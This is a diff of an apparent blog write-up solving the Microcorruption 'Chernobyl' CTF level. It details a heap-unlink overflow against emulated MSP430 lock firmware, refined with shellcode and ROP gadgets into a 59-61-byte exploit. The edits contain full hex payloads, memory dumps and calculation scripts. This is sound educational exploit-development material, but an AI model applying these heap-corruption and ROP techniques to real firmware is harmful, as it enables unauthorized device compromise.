@@ -141,7 +141,7 @@
 
       <h3>Enter Chernobyl</h3>
 
-      <p>Ninety-eight percent of documented attempts fail before beating Chernobyl (<em>#18</em>), the last heap exploitation challenge. The top 1% complete the series; the top 1% of the top 1% climb into single-digit rankings on the Chernobyl leaderboard.</p>
+      <p>Ninety-eight percent of documented attempts fail before beating Chernobyl, the last heap exploitation challenge. The top 1% complete the series; the top 1% of the top 1% climb into single-digit rankings on the Chernobyl leaderboard.</p>
 
       <br>
       <table>
@@ -160,7 +160,7 @@
 		  <td><code>59</code></td>
           </tr>
           <tr>
-		  <td><code>2nd</code></td>
+		  <td><code><mark>2nd</mark></code></td>
 		  <td><code>b9ek</code></td>
 		  <td><code>59</code></td>
           </tr>
@@ -632,7 +632,7 @@ def hash_username(s):
     return r15
 </code></pre>
 
-<p>The following code calculates the index for the hash bucket storing a given username.</p>
+<p>The following code calculates the index for the hash bucket that will store a given username.</p>
 
 <pre><code>python3 -i hash.py
 &gt;&gt;&gt; hash_username(binascii.hexlify(b'user1')) % 8
@@ -1254,7 +1254,7 @@ Adding user account <mark>bbbbbbbbbbbbbbbb</mark> with pin 0002.
 	<li>Free the old table.</li>
 </ol>
 
-<p>Crucially, the last step should free the overflowed chunk and trigger the arbitrary write. Adding six accounts is necessary to cause the overflow, so initiating this behavior requires creating an additional six accounts in any hash bucket.</p>
+<p>Crucially, the last step should free the overflowed chunk and trigger the arbitrary write. Adding the first six accounts is necessary to cause the overflow, so adding another six will trigger this behavior.</p>
 
 <h5>Additional Input:</h5>
 <pre><code>new user1 0002;new user2 0002;new user3 0002;new user4 0002;new user5 0002;new user6 0002</code></pre>
@@ -1377,7 +1377,7 @@ Adding user account user6 with pin 0002.</code></pre>
 50c0: *  
 </code></pre>
 
-<p>It is also necessary that the size has the least significant bit (the "in-use" bit) set—otherwise, <code>malloc</code> attempts will incorrectly interpret the corrupted chunk as free when the <code>rehash</code> function is allocating space for the new hash table. If the algorithm parses the chunk as free, it will cause the new hash table to partially overlap the old one—which is messy and unnecessary.</p>
+<p>It is also necessary that the size has the least significant bit (the "in-use" bit) set—otherwise, <code>malloc</code> will incorrectly interpret the corrupted chunk as free when the <code>rehash</code> function is allocating space for the new hash table. If the algorithm parses the chunk as free, it will cause the new hash table to partially overlap the old one—which is messy and unnecessary.</p>
 
 <p><b>Hash table collision byte:</b> most of the time, there will need to be an extra byte that can be set to an arbitrary value so that the username will end up in the correct hash bucket (bucket zero).</p>
 
@@ -1447,7 +1447,8 @@ Adding user account user6 with pin 0002.
 	<li>Check whether <code>fd</code> is higher in memory than the <em>start of the heap.</em></li>
 </ol>
 
-<p>Unlike on Algiers, where the heap starts at <code>0x2400</code>, it is at address <code>0x5000</code> on this firmware version. Both the stack and text segments reside in the <code>0x3000-0x4F00</code> range. Either of the above checks breaks the exploit because all realistic write targets are in lower memory than the heap.
+
+<p>The heap starts at address 0x5000 on this firmware version—unlike Algiers, where it begins at a lower address than the stack. Here, both the stack and text segments reside in the <code>0x3000-0x4F00</code> range. Either of the above checks breaks the exploit because all realistic write targets are in lower memory than the heap.</p>
 
 
 <p>Reverting the forward pointer to its original value and tweaking the collision byte corrects this error.</p>
@@ -1487,7 +1488,7 @@ fee0: *
       </figure>
       <hr>
 
-      <p>This conditional block executes when the user supplies an invalid command. Corrupting the above instruction and executing the code in this conditional block misaligns the stack frame and causes it to overlap a large buffer storing unparsed commands. The corrupted code will pop several words off the stack and then return to an attacker-controlled word.</p>
+      <p>This conditional block executes when the user supplies an invalid command. Corrupting the above instruction misaligns the stack frame and causes it to overlap a large buffer storing unparsed commands. The corrupted code will pop several words off the stack and then return to an attacker-controlled word.</p>
 
 <h4>Exploit Modifications</h4>
 <p>The existing exploit must be tweaked as follows.</p>
@@ -1581,7 +1582,7 @@ The CPU completed in 125800 cycles.
 	<p>Dealing with these issues is necessary to shorten the exploit to 59 bytes.</p>
 
 	<h2>Exploit Size Optimization</h2>
-	<p>Recall that the goal is to shorten the length of the exploit as much as possible. The current version is 194 bytes.</p>
+	<p>The current exploit is 194 bytes.</p>
 
 	<pre><code>&gt;&gt;&gt; import binascii
 &gt;&gt;&gt; len("new user05 0002;new user16 0002;new user27 0002;new user38 0002;new user49 0002")
@@ -1649,7 +1650,7 @@ The CPU completed in 125800 cycles.
 <pre><code>Adding user account a with pin 0000.
 </code></pre>
 
-<p>In other words, it is possible to omit pins from every command.</p>
+<p>In other words, omitting the pin from every command is possible.</p>
 
 
 <pre><code>6e657720f0
@@ -1733,7 +1734,9 @@ The CPU completed in 125800 cycles.
 
 <input type="checkbox" id="sn-1" class="sidenote-toggle" />
 <span class="sidenote">
-Without getting into details, it is necessary to note that the overflow <em>must</em> occur in hash bucket zero and overwrite the heap metadata for hash bucket one—otherwise, the previous chunk merging forward will corrupt the overflowed back pointer. Avoiding reliance on the back pointer would require the capability to set the forward pointer to arbitrary addresses, which is impossible because <code>free</code> is only called after <code>malloc</code> follows the forward pointers to traverse the linked list.</span></p>
+Without getting into details, it is necessary to note that the overflow <em>must</em> occur in hash bucket zero and overwrite the heap metadata for hash bucket one—otherwise, the previous chunk merging forward will corrupt the overflowed back pointer. Avoiding reliance on the back pointer would require the capability to set the forward pointer to arbitrary addresses, which is impossible because that would break the linked list. The <code>free</code> function is only called after <code>malloc</code> follows the forward pointers to traverse the linked list, which means the heap exhaustion error will trigger before the arbitrary write.</span></p>
+
+
 
 
 <h4>Pruning Excess Bytes</h4>
@@ -1755,7 +1758,7 @@ Without getting into details, it is necessary to note that the overflow <em>must
 324000ffb0121000<mark>ec3d</mark>
 </code></pre>
 
-<p>There must be padding preceding the return address to align it correctly, so making the shellcode shorter will not affect the length of the exploit. All accounts are the minimum possible length, leaving only one place to prune: the overflow.</p>
+<p>There must be padding preceding the return address to align it correctly, so making the shellcode shorter will not affect the length of the exploit. All accounts are the minimum possible length. There is only one place to prune: the overflow.</p>
 
 <pre><code>6e000000f0
 6e000000e0
@@ -1780,14 +1783,9 @@ Without getting into details, it is necessary to note that the overflow <em>must
 	<li>Ensure the overflow occurs in the correct hash bucket.</li>
 	</ol>
 
-	<p>In a perfect world, the exploit requires only the back pointer.</p>
-
-<pre><code>6e000000<mark>c64c</mark>fc50ffff62
-</code></pre>
-
 <p>Given an eight-bucket hash table, any target address has a 1 in 8 chance of hashing to bucket zero. Supposing it does, that renders the forward pointer, size, and collision byte unnecessary.</p>
 
-<p>Assuming the stars align perfectly, the above section of the exploit reduces to only the following bytes.</p>
+<p>Assuming the stars align perfectly, only overflowing the back pointer is required.</p>
 
 <pre><code>6e000000<mark>c64c</mark></code></pre>
 
@@ -1798,9 +1796,9 @@ Without getting into details, it is necessary to note that the overflow <em>must
 </code></pre>
 
 
-<p>There may be other viable instructions or data structures resident at an address that hashes to bucket zero, but address <code>0x4cc6</code>, used up to this point, does not.</p>
+<p>There may be other viable instructions or data structures resident at a location that hashes to bucket zero, but the address used up to this point (<code>0x4cc6</code>) does not.</p>
 
-<p>The exploit size shrinks by no more than five bytes if it is possible to find such a target. It is impossible, using the random write primitive discussed heretofore, to craft an exploit shorter than 67 bytes. In the best-case scenario, that nets a leaderboard ranking in the top two dozen—a far cry from the 59-byte record.</p>
+<p>Even if that were the case, the exploit size could shrink by no more than five bytes. It is thus impossible, using the random write primitive discussed heretofore, to craft an exploit shorter than 67 bytes. In the best-case scenario, that nets a leaderboard ranking in the top two dozen—a far cry from the 59-byte record.</p>
 
 <h3>Hitting Top Fifteen</h3>
 <p>Sixty-six bytes is the dividing line between people who understand the heap implementation and those who do not. Crossing this threshold requires an entirely different technique.</p>
@@ -1853,7 +1851,7 @@ Without getting into details, it is necessary to note that the overflow <em>must
 </ul>
 
 
-<p>In this case, avoiding <code>malloc</code> allocating the corrupted chunk and breaking the exploit requires setting the "in-use bit" on the size. Adding <code>0x1</code> to the size accomplishes this. That aside, the technique works the same way.</p>
+<p>In this case, avoiding <code>malloc</code> allocating the corrupted chunk and breaking the exploit requires setting the "in-use bit" on the size. That aside, the technique works the same way.</p>
 
 <pre><code>&gt;&gt;&gt; shellcode_address &#x3D; 0x3df0
 &gt;&gt;&gt; return_address &#x3D; 0x49a2
@@ -1877,7 +1875,7 @@ Without getting into details, it is necessary to note that the overflow <em>must
 6e000000324000ffb01210
 </code></pre>
 
-<p>Additionally, there is no need to provide an invalid command at the end, as execution is redirected just after the first call to <code>free</code>. This change allows the omission of the null byte at the end of the shellcode—saving one byte—and the shellcode to be sent as the last username to trigger the rehash.</p>
+<p>Additionally, there is no need to provide an invalid command at the end, as execution is redirected just after the first call to <code>free</code>. This change allows the omission of the null byte at the end of the shellcode—saving one byte. The shellcode can also be sent as the last username to trigger the rehash.</p>
 
 <pre><code>6e000000f0
 6e000000e0
@@ -1971,15 +1969,14 @@ Adding user account  with pin 0000.
 <p>Recall how the preceding command works. Sending <code>6e</code> is equivalent to sending <code>6e00000000</code>. Notice the following pattern.</p>
 
 <h5>Example Null Username</h5>
-<pre><code>6e000000<mark>00</mark>
-</code></pre>
+<pre><code>6e000000<mark>00</mark></code></pre>
 
 <h5>Injected Shellcode</h5>
-<pre><code>6e003240<mark>00</mark>ffb01210
-</code></pre>
+<pre><code>6e003240<mark>00</mark>ffb01210</code></pre>
 
-<p>Sending <code>6e</code> adds a username that is a single null byte. The part of the shellcode interpreted as the first byte of the username is also null, which causes the implementation to parse that null byte as the whole username. This input is equivalent to adding the same username twice.</p> 
+<p>Sending <code>6e</code> by itself earlier added a single null byte username. The third byte of the shellcode, also null, is parsed as a username. The implementation will thus throw an error because this payload inadvertently adds the same username twice.</p>
 
+<h4>Abusing Status Register Flags</h4>
 <p>Recall that the shellcode disassembles to the following instructions.</p>
 
 <pre><code>3240 00ff      mov      #0xff00, sr
@@ -2215,7 +2212,7 @@ A backend change altered how interrupt calls interpret the contents of <code>SR<
 5360: *                                                    
 </code></pre>
 
-<p>This behavior means the existing forward pointer (<code>0x50fc</code>) is replaceable with any of the seven others. Given eight forward pointers, each with a 1 in 8 chance to cause the hash of the exploit to be zero, the inclusive probability of success is 1. The collision byte is now unnecessary, and the search for a forward pointer that causes the exploit to hash to bucket zero can be automated as follows.</p>
+<p>This behavior means the existing forward pointer (<code>0x50fc</code>) is replaceable with any of the seven others. Given eight forward pointers, each with a 1 in 8 chance to cause the hash of the exploit to be zero, the inclusive probability of success is 1. The collision byte is now unnecessary, which reduces the exploit length by one byte. The search for a forward pointer that causes the exploit to hash to bucket zero can be automated as follows.</p>
 
 <pre><code>&gt;&gt;&gt; fdlist = [&quot;fc50&quot;, &quot;5c51&quot;, &quot;bc51&quot;, &quot;1c52&quot;, &quot;7c52&quot;, &quot;dc52&quot;, &quot;3c53&quot;]
 &gt;&gt;&gt; for i in fdlist:
@@ -2226,9 +2223,7 @@ A backend change altered how interrupt calls interpret the contents of <code>SR<
 &gt;&gt;&gt;
 </code></pre>
 
-<p>Luck is unfavorable in this case, and the search yields nothing. None of the other forward pointers cause the exploit to hash to bucket zero.</p>
-
-<p>There is a way around this, however. Recall that this exploit redirects execution to the shellcode beginning here:</p> 
+<p>Luck is unfavorable in this case, and the search yields nothing. None of the other forward pointers cause the exploit to hash to bucket zero. There is a way around this, however. Recall that this exploit redirects execution to the shellcode beginning here:</p> 
 
 <pre><code>6e000000f0
 6e000000e0
@@ -2333,7 +2328,7 @@ b&apos;ca3ddc5245f4&apos;
 
 <h4>Sixty-One Bytes</h4>
 
-<p>The next question is whether the shellcode is as optimized as possible. It is practically impossible to trigger the unlock interrupt in less than four words of shellcode. The current version is only seven bytes, as omitting the trailing null works without issue. The details for developing this optimized shellcode are irrelevant, but suffice it to say that the last instruction must be <code>CALL 0x10</code> to allow for the omission of the eighth byte.</p>
+<p>The next question is whether the shellcode is as optimized as possible. It is practically impossible to trigger the unlock interrupt in less than four words of shellcode. The details for developing the optimized current payload are irrelevant, but suffice it to say that the last instruction must be <code>CALL 0x10</code> to allow for the omission of the eighth byte. This shellcode is as short as is realistic on this ISA.</p>
 
 <h5>Regular Shellcode</h5>
 <pre><code>3240 01ff b012 10<mark>00</mark></code></pre>
@@ -2341,13 +2336,13 @@ b&apos;ca3ddc5245f4&apos;
 <h5>Shellcode Without Trailing Null</h5>
 <pre><code>3240 01ff b012 10</code></pre>
 
-<p>The next step is replacing the shellcode with more space-efficient ROP gadgets.</p>
+<p>The next step is replacing this shellcode with more space-efficient ROP gadgets.</p>
 
 <h4>Return Oriented Programming</h4>
 
-<p>The first crucial requirement is taking control of the stack. The stack pointer must overlap a buffer filled with attacker-chosen ROP gadgets. The stack layout is as follows at the time of the unlink.</p>
+<p>The first crucial requirement is taking control of the stack. The stack pointer must overlap a buffer filled with attacker-chosen ROP gadgets. The stack layout is as follows at the time of the unlink. The return address for <code>free</code> is at address <code>0x3dce</code>.</p>
 
-<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
+<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 <mark>a249</mark>   .M...MtH,P.P.P.I
 3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
 3de0: 0650 6a48 f03d 0000 f63d bc4c 6e40 3240   .PjH.&#x3D;...&#x3D;.Ln@2@
 3df0: 01ff b012 1000 0000 0000 0000 0000 0000   ................
@@ -2365,17 +2360,8 @@ b&apos;ca3ddc5245f4&apos;
 3e10: *  
 </code></pre>
 
-<p>The return address for <code>free</code> is at address <code>0x3dce</code>.</p>
 
-<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 <mark>a249</mark>   .M...MtH,P.P.P.I
-3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
-3de0: 0650 6a48 f03d 0000 f63d bc4c 6e40 3240   .PjH.&#x3D;...&#x3D;.Ln@2@
-3df0: 01ff b012 1000 0000 0000 0000 0000 0000   ................
-3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
-3e10: *  
-</code></pre>
-
-<p>The goal is to overwrite the return address so that it returns to a gadget comprised of several <code>POP</code> instructions, which will increment the stack pointer until it overlaps the buffer containing untrusted input and cause the program to return to an attacker-controlled word. The first word that is fully attacker-controlled is here:</p>
+<p>The goal is to overwrite the return address so that it returns to a gadget comprised of several <code>POP</code> instructions, which will increment the stack pointer until it overlaps the buffer containing untrusted input. The firmware will then return to a fully attacker-controlled word.</p>
 
 <pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
 3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
@@ -2395,7 +2381,7 @@ b&apos;ca3ddc5245f4&apos;
 3e10: *  
 </code></pre>
 
-<p>Such an operation is unrealistic, as this MCU has sixteen registers—only twelve of which are general purpose. A search through the disassembly reveals that the most optimal one is only eight <code>POP</code> instructions.</p>
+<p>Such an operation is unrealistic, as this MCU has sixteen registers—only twelve of which are general purpose. A search through the disassembly reveals that the most optimal one is only eight <code>POP</code> instructions long.</p>
 
 <pre><code>49ba:  3441           pop       r4
 49bc:  3541           pop       r5
@@ -2410,7 +2396,7 @@ b&apos;ca3ddc5245f4&apos;
 
 <h4>Overwriting Return Addresses In The Outer Scope</h4>
 
-<p>The lack of sufficiently long sequences of <code>POP</code> instructions necessitates overwriting a different return address—ideally, one closer to the buffer containing attacker-controlled data. The return address for the <code>rehash</code> function is a suitable candidate.</p>
+<p>The lack of suitable gadgets necessitates overwriting a different return address—ideally, one closer to the buffer containing attacker-controlled data. The return address for the <code>rehash</code> function is a viable candidate.</p>
 
 <pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
 3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
@@ -2430,7 +2416,7 @@ b&apos;ca3ddc5245f4&apos;
 3e10: *  
 </code></pre>
 
-<p>Targeting this return address shortens the required sequence to only one <code>POP</code> instruction. There are a dozen such ROP gadgets available.</p>
+<p>Targeting this one shortens the required sequence to only one <code>POP</code> instruction. There are a dozen such ROP gadgets available.</p>
 
 <h5>Attempt #1:</h5>
 <p>The gadget at address <code>0x4562</code> is selected arbitrarily.</p>
@@ -2439,7 +2425,7 @@ b&apos;ca3ddc5245f4&apos;
 4564:  3041           ret
 </code></pre>
 
-<p>The location pointed to by the target return address is <code>0x4cbc</code>. Calculating the correct size field proceeds as follows.</p>
+<p>The target return address points to address <code>0x4cbc</code>. Calculating the correct size field proceeds as follows.</p>
 
 <pre><code>&gt;&gt;&gt; rop_gadget_address = 0x4562
 &gt;&gt;&gt; return_address = 0x4cbc
@@ -2504,7 +2490,7 @@ b&apos;<mark>e63ddc5257fa</mark>&apos;
 <p>This exploit will not work because it attempts to return to a ROP gadget and finds a word of shellcode instead, so the next step is to fix that.</p>
 
 <h4>Size Optimized ROP Chain</h4>
-<p>Initially, dummy values pointing to odd-valued addresses replace the above exploit's shellcode.</p>
+<p>Consider the following dummy values.</p>
 
 <pre><code>6e000000f0
 6e000000e0
@@ -2520,7 +2506,7 @@ b&apos;<mark>e63ddc5257fa</mark>&apos;
 6e00<mark>1111333355557777</mark>
 </code></pre>
 
-<p>An attempt to return to any of these words will result in the "<code>insn address unaligned</code>" crash on this ISA, which verifies that the exploit is working correctly. Here is what happens as the processor attempts to return to address <code>0x1111</code>.</p>
+<p>An attempt to return to any of these words will result in the "<code>insn address unaligned</code>" crash on this ISA, which verifies that the exploit is working correctly. The crash happens when the processor attempts to return to address <code>0x1111</code>.</p>
 
 <h5>Debugger Output</h5>
 <pre><code>insn address unaligned
@@ -2646,11 +2632,11 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
   <li><a href="#int-call-3">03</a></li>
 </ul>
 
-<p>The calling function passes interrupt number <code>0x7F</code> to <code>INT</code> (which calls address <code>0x10</code>). If the exploit returns directly to <code>INT</code>, there must be a word before the interrupt number where the return address would be.</p>
+<p>The calling function passes interrupt number <code>0x7F</code> to <code>INT</code>—the function that calls address <code>0x10</code>. If the exploit returns directly to <code>INT</code>, there must be a word before the interrupt number where the return address would be.</p>
 
 <pre><code>6e00ec4c<mark>ffff</mark>7f</code></pre>
 
-<p>This ROP payload is shorter than the shellcode but is still not the minimum length. Returning into the middle of another function, at the exact instruction where it calls <code>INT</code>, avoids the dummy return address taking up space in the ROP chain. The end of the <code>puts</code> function works nicely for this.</p>
+<p>This ROP payload is shorter than the shellcode but is still not the minimum length. Returning into the middle of <em>another</em> function, at the exact instruction where <em>it</em> calls <code>INT</code>, avoids the dummy return address taking up space in the ROP chain. The end of the <code>puts</code> function works nicely for this.</p>
 
 <pre><code>4d6a:  3012 0a00      push      #0xa
 4d6e:  0312           push      #0x0
@@ -2665,7 +2651,7 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
 
 <pre><code>6e00<mark>704d7f</mark></code></pre>
 
-<p>The full exploit is as follows.</p>
+<p>The full exploit is below.</p>
 
 <pre><code>6e000000f0
 6e000000e0
@@ -2681,14 +2667,14 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
 6e00704d7f
 </code></pre>
 
-<p>This payload successfully triggers the unlock interrupt.</p>
+<p>This version successfully triggers the unlock interrupt.</p>
 
 <pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
 <mark>61</mark></code></pre>
 
 <h4>Sixty Bytes</h4>
 
-<p>The executing firmware adds the corrupted size field to the return address and returns to a ROP gadget comprised of a single <code>POP</code> instruction. Considering that there are a dozen such gadgets, one may be within 256 bytes of the return location—meaning it may be possible to redirect execution to a <code>POP</code> gadget by overflowing the size field by only one byte.</p>
+<p>The executing firmware adds the corrupted size field to the return address and returns to a ROP gadget comprised of a single <code>POP</code> instruction. Considering that there are a dozen such gadgets, one may be within 256 bytes of the return location—meaning it may be possible to redirect execution to a <code>POP</code> gadget with only a single byte overflow in the size field.</p>
 
 <p>The rehash function returns here.</p>
 
@@ -2746,7 +2732,7 @@ b&apos;<mark>e63dfc5013</mark>&apos;
 6e000000d0
 6e000000c0
 6e000000b0
-6e000000e63dfc5013
+6e000000<mark>e63dfc5013</mark>
 6e000000aa
 6e000000bb
 6e000000cc
@@ -2855,11 +2841,11 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
   <li><a href="#fake-chunk-corruption-7">Call 7</a></li>
 </ul>
 
-<p>Recall that the unlink exploit relies on the implementation interpreting three words on the stack as being part of a heap chunk to perform the write. In this case, the forward pointer and size of the "chunk" are updated by every <code>free</code> call after the initial write occurs. This bug is unique to this particular exploit—it does not affect the previous ones.</p>
+<p>Recall that performing the write requires the implementation to interpret three words on the stack as being part of a heap chunk. In this case, the forward pointer and size of that "chunk" are updated by every <code>free</code> call after the initial write occurs. This bug is unique to this particular exploit—it does not affect the previous ones.</p>
 
 <h4>Regression Testing</h4>
 
-<p>Think about what is required for this behavior to occur. The <code>free</code> function must be called multiple times, so this must be a byproduct of the choice to change the target return address to one in the outer scope. Recall that previous exploits overwrote the return address for the first <code>free</code> call, so execution never reached the others. Changing the target return address was necessary to switch from shellcode to ROP gadgets, so the 61-byte exploit must have introduced this issue.</p>
+<p>Think about what is required for this behavior to occur. The <code>free</code> function must be called multiple times, so this issue must be a byproduct of the choice to change the target return address to one in the outer scope. Previous exploits overwrote the return address for the first <code>free</code> call, so execution never reached the others. Changing the target return address was necessary to switch from shellcode to ROP gadgets, so the 61-byte exploit must have introduced this issue.</p>
 
 <h4>Differential Analysis</h4>
 
@@ -2873,7 +2859,7 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
 3e10: *
 </code></pre>
 
-<p>With this exploit, subsequent calls to <code>free</code> do not update the above two words. There must be some difference between these two exploits to result in this behavior. The back pointer and ROP gadgets have not changed, so the only difference between the two is the forward pointer and the size.</p>
+<p>With that exploit, subsequent calls to <code>free</code> do not update the above two words. There must be some difference between these two exploits to result in this behavior. The back pointer and ROP gadgets have not changed, so the only difference between the two is the forward pointer and the size.</p>
 
 <h5>Length: 61 bytes</h5>
 <pre><code>
@@ -3717,7 +3703,7 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
   <li><a href="#normal-free-call-15">15</a></li>
 </ul>
 
-<p>These actions are constituent steps in the part of the <code>free</code> algorithm that consolidates adjacent free chunks. Notice how it adds the cumulative sizes to that field in the chunk just before the overflowed one.</p>
+<p>These actions are constituent steps in the part of the <code>free</code> algorithm that consolidates adjacent free chunks. Notice how it adds the cumulative sizes to the size field in the chunk just before the overflowed one.</p>
 
 <pre><code class='language-ascii-noshadows'>  ┌───────────────────────────────┬───────────────────────────────┐
   │        BEFORE FREE #1         │         AFTER FREE #4         │
@@ -4046,14 +4032,14 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
   └────────┴────────┴────────┘    │                                  
 </code></pre>
 
-<p>The new forward pointer effectively breaks the linked list, causing the algorithm to write the sum of all freed chunk sizes to the size field in the overflowed chunk rather than the "chunk" on the stack. Additional testing confirms that this works when skipping any number of chunks. Eliminating the bug can thus be accomplished by omitting <code>0x50fc</code> from the list of forward pointers.</p>
+<p>The new forward pointer effectively breaks the linked list in a way that causes the algorithm to write the sum of all freed chunk sizes to the size field in the overflowed chunk—rather than the "chunk" on the stack. Additional testing confirms that this works when skipping any number of chunks. Eliminating the bug can thus be accomplished by omitting <code>0x50fc</code> from the list of forward pointers.</p>
 
 <pre><code>&gt;&gt;&gt; fdlist = ["5c51", "bc51", "1c52", "7c52", "dc52", "3c53"]</code></pre>
 
 
 <h4>Partially Skipping Function Prologues</h4>
 
-<p>After this, the search for a suitable ROP gadget becomes increasingly constrained. None of the single <code>POP</code> instruction gadgets hash to the correct bucket. The nearest location in memory with a viable alternative gadget is near the beginning of the <code>putchar</code> function.</p>
+<p>After this, the search for a suitable ROP gadget becomes increasingly constrained. None of the single <code>POP</code> gadgets hash to the correct bucket. The nearest location in memory with a viable alternative gadget is near the beginning of the <code>putchar</code> function.</p>
 
 <pre><code>4d04:  2183           decd      sp
 <mark>4d06:  0f12           push      r15</mark>
@@ -4065,7 +4051,7 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
 4d1a:  3041           ret
 </code></pre>
 
-<p>Returning here will skip the first instruction in the function and misalign the stack pointer by one word. The function will then make a harmless call to write a single character to the I/O console. When the interrupt call returns, <code>putchar</code> will increment the stack pointer and return. Because returning into the middle of the function earlier skipped the first push instruction during the function prologue, this causes the stack pointer to overlap the attacker-controlled buffer. The size field to accomplish this is as follows.</p>
+<p>Returning here will skip the first instruction in the function and misalign the stack pointer by one word. The function will then make a harmless call to write a single character to the I/O console. When the interrupt call returns, <code>putchar</code> will increment the stack pointer and return. Because returning into the middle of the function earlier skipped the first push instruction during the function prologue, this causes it to pop an extra word off the stack and align the stack pointer with attacker-controlled data. The size field to accomplish this is as follows.</p>
 
 <pre><code>&gt;&gt;&gt; rop_gadget_address = 0x4d06
 &gt;&gt;&gt; return_address = 0x4cbc
@@ -4091,7 +4077,7 @@ b&#39;e63ddc5245&#39;
 6e000000d0
 6e000000c0
 6e000000b0
-6e000000e63d1c5245
+6e000000<mark>e63d1c5245</mark>
 6e000000aa
 6e000000bb
 6e000000cc
@@ -4109,10 +4095,6 @@ b&#39;e63ddc5245&#39;
 
 <p>Shrinking the exploit to this length puts it in 4th place globally on the Chernobyl exploit size leaderboard.</p>
 
-<blockquote>
-There are only about six people in the world who could set up fail-safes like this.<br>
-<cite>— Q, James Bond: Skyfall</cite>
-</blockquote>
 
       <br>
       <table>
@@ -4160,6 +4142,10 @@ There are only about six people in the world who could set up fail-safes like th
 
       <p>The exploit is now in a three-way tie for the second shortest input length.</p>
 
+<blockquote>
+There are only about six people in the world who could set up fail-safes like this.<br>
+<cite>— Q, James Bond: Skyfall</cite>
+</blockquote>
 
 <h3>Tying The World Record</h3>
 
@@ -4177,7 +4163,7 @@ There are only about six people in the world who could set up fail-safes like th
 50c0: *
 </code></pre>
 
-<p>There is no null termination for the username that overflows the heap metadata, which makes it possible to overflow the back and forward pointers without corrupting the size.</p>
+<p>There is no null termination for the string that overflows the heap metadata, which makes it possible to overflow the back and forward pointers without corrupting the size.</p>
 
 <pre><code>5090: 0000 0000 0000 0000 0000 0000 <mark>3c50 fc50</mark>   ............&lt;P.P
 50a0: b500 0000 0000 0000 0000 0000 0000 0000   ................
@@ -4228,7 +4214,7 @@ of this happening are around 1 in 5 at best—without accounting for many potent
 
 <ol>
 	<li>The <code>malloc</code> function traverses the linked list and allocates from the first free chunk it finds—usually the wilderness chunk.</li>
-	<li>The <code>free</code> function is called iteratively on an array of pointers referencing in-use heap chunks.</li>
+	<li>During <code>rehash</code>, the <code>free</code> function is called iteratively on an array of pointers referencing in-use heap chunks.</li>
 </ol>
 
 <p>The forward pointer does not affect the arbitrary write—the sole purpose of setting it to a specific value is to avoid the <code>malloc</code> heap exhaustion error. This issue is avoidable if <code>malloc</code> finds a large enough free chunk for allocation. The earlier solution to this problem is to ensure the algorithm eventually reaches the wilderness chunk, but nothing requires it to allocate from that <em>specific</em> free chunk.</p>
@@ -4249,7 +4235,7 @@ ffe0: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
 fff0: 4444 4444 4444 4444 4444 4444 4444 0044   DDDDDDDDDDDDDD.D
 </pre></code>
 
-<p>All these words are high value and even, so aiming the forward pointer into the middle of the structure will cause the algorithm to interpret one of them as the next chunk's size. The <code>malloc</code> function will then allocate from that fake chunk, avoiding the heap exhaustion error. Suppose the forward pointer is <code>0xff86</code>. The fake chunk metadata will be here:</p>
+<p>All these words are high value and even, so aiming the forward pointer into the middle of the structure will cause the algorithm to interpret one of them as the next chunk's size. The <code>malloc</code> function will then allocate from that fake "next chunk", avoiding the heap exhaustion error. Suppose the forward pointer is <code>0xff86</code>. The fake chunk metadata will be here:</p>
 
 <pre><code>ff80: 4444 4444 4444 <mark>4444 4444 4444</mark> 4444 4444   DDDDDDDDDDDDDDDD
 ff90: 4444 4444 4444 4444 4444 4444 4444 4444   DDDDDDDDDDDDDDDD
@@ -4325,7 +4311,7 @@ fff0: 4444 4444 4444 4444 4444 4444 4444 0044   DDDDDDDDDDDDDD.D
 <p>This phenomenon causes the next chunk to be lower than the start of the heap at address <code>0x5000</code>, triggering the error.</p>
 
 <h4>Misaligning Forward Pointers</h4>
-<p>This error is a setback, but it demonstrates that the first few allocations from the fake wilderness chunk can succeed. The only issue is that the data structure is at the top of the address space, which necessitates finding a different one low enough in memory to avoid causing an integer overflow upon allocation. These are the viable candidates.</p>
+<p>Again, the first few allocations from the fake wilderness chunk succeed. The only issue is that the data structure is at the top of the address space, which necessitates finding a different one low enough in memory to avoid causing an integer overflow upon allocation. These are the viable candidates.</p>
 
 <pre><code>5000: 0050 1050 1500 0000 0300 0500 1650 2c50   .P.P.........P,P
 5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
@@ -4477,7 +4463,7 @@ The failure of this attempt is a shame because it would have shrunk the exploit 
 
 <h5>Attempt #3:</h5>
 
-<p>Consider the chunk containing hash bucket 3.</p>
+<p>Below is the chunk containing hash bucket #3. The corrupted forward pointer is misaligned as follows.</p>
 
 <pre><code>5150: 0000 0000 0000 0000 <mark>0000</mark> 0000 <mark>fc50</mark> bc51   .............P.Q
 5160: b500 0000 0000 0000 0000 0000 0000 0000   ................
@@ -4485,7 +4471,8 @@ The failure of this attempt is a shame because it would have shrunk the exploit 
 5180: *  
 </code></pre>
 
-<p>A corrupted forward pointer aimed two bytes before that chunk's back pointer produces the following result.</p>
+<p>The result:</p>
+
 
 <pre><code>&gt;&gt;&gt; overflow = b&apos;e63d&apos; + b&apos;<mark>5851</mark>&apos;
 ... if hash_username(overflow) % 8 == 0:
